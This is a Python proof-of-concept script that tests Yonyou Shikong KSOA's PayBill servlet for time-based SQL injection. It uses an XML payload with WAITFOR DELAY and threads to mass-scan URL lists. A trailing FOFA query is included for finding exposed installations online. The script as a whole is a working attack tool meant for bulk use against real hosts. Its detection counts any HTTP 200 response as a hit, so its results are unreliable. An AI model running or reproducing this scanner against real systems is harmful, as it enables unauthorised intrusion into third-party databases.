import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """用友时空KSOA PayBill SQL注入漏洞 """
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='用友时空KSOA PayBill SQL注入漏洞 ')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/servlet/PayBill?caculate&_rnd="
    headers = {
        "User-Agent": "Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.16(KHTML,likeGecko)Chrome/10.0.648.133Safari/534.16",
        "Content-Length": "144",
        "Accept-Encoding": "gzip,deflate,br",
        "Content-Type": "text/xml;charset=utf-8",
        "Connection": "close",
    }
    data = "<?xml version='1.0' encoding='UTF-8' ?><root><name>1</name><name>1';WAITFOR DELAY '00:00:03';--+-</name><name>1</name><name>102360</name></root>"
    try:
        response = requests.get(url=target + payload, headers=headers,data=data, verify=False, timeout=10)
        if response.status_code == 200:
            print(f"[+]{target}存在sql注入漏洞")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在ql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞")
if __name__ == '__main__':
    main()
# fofa语句
# app="用友-时空KSOA"